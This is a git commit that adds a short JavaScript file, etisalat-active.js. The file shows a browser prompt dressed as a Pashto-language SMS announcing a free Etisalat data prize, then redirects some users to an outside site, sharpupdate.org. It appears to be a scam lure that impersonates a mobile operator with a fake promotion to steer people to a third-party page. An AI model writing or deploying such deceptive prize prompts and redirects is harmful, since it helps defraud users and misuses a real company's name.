394f5fbadd2e4d9abd9170df8a23cf01c06b0aba
ekperikpe <ekperikpe588@gmail.com>
2025-06-26 08:07:38 +0100

    Create etisalat-active.js

---
+++ etisalat-active.js
@@ -0,0 +1,5 @@
+var password = '۱۰۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو د اتصالات سیم کارت د وړیا ډیټا د زوړ سیم کارت انعام ترلاسه کولو وړ دی، اوس د فعالولو لپاره په OK کلیک وکړئ.','۱۰۰ جي بي فعال کړئ');
+if (password != '۱۰۰ جي بي فعال کړئ') {
+location.href='https://sharpupdate.org/etisalat.html';
+}
